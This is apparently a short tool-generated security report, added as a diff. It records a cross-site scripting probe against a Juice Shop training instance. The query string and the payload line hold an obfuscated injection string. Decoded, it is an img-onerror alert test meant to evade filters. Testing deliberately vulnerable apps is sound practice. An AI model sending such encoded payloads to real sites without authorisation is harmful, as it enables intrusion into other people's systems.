@@ -1,0 +1,6 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: juice-shop.herokuapp.com?q=e3x\92x\72x\37x\37x\87x\72x\82x\47x\27x\56x\c6x\16x\d3x\27x\f6x\27x\27x\56x\e6x\f6x\02x\87x\d3x\36x\27x\37x\02x\76x\d6x\96x\c3x\
+
+[STATUS]: 200
+[PAYLOAD]: e3x\92x\72x\37x\37x\87x\72x\82x\47x\27x\56x\c6x\16x\d3x\27x\f6x\27x\27x\56x\e6x\f6x\02x\87x\d3x\36x\27x\37x\02x\76x\d6x\96x\c3x\
+---
